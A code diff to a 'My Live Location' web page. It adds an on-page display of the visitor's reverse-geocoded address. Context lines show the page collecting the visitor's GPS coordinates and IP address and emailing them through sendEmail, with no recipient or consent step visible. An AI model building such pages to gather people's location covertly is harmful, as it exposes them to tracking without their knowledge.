@@ -7,7 +7,7 @@
     <title>My Live Location</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: "Roboto", sans-serif;
@@ -74,10 +74,13 @@
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const ipAddress = await getIP();
                     const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
-
+                    
                     // Set latitude and longitude in the input fields
                     document.getElementById("latitude").value = position.coords.latitude;
                     document.getElementById("longitude").value = position.coords.longitude;
+
+                    // Display location result
+                    displayLocationResult(locationData);
 
                     // Send email with location data
                     sendEmail(position, ipAddress, locationData);
@@ -97,6 +100,17 @@
             } catch (error) {
                 console.error("Error fetching location details:", error);
                 return {};
+            }
+        }
+
+        function displayLocationResult(data) {
+            const locationResult = document.getElementById("locationResult");
+            if (data && data.display_name) {
+                locationResult.textContent = `Location: ${data.display_name}`;
+                locationResult.style.display = "block";
+            } else {
+                locationResult.textContent = "Location details not available.";
+                locationResult.style.display = "block";
             }
         }
 
